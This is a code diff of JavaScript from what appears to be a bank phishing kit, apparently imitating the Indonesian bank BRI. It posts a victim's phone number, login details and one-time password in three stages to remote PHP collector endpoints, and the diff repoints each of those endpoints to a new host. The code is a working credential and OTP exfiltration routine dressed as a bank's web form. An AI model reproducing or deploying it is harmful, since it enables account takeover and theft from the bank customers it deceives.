@@ -5,7 +5,7 @@ function sendHp() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/v9-B/one.php',
+      url: 'https://choreo.cloud/bri/britarifv9-virtual1/one.php',
       data: $('#inputHp').serialize(),
       complete: function(data) {
          vibr(220);
@@ -36,7 +36,7 @@ function sendLogin() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/v9-B/two.php',
+      url: 'https://choreo.cloud/bri/britarifv9-virtual1/two.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -68,7 +68,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://chroedevsi.whf.bz/v9-B/three.php',
+      url: 'https://choreo.cloud/bri/britarifv9-virtual1/three.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')
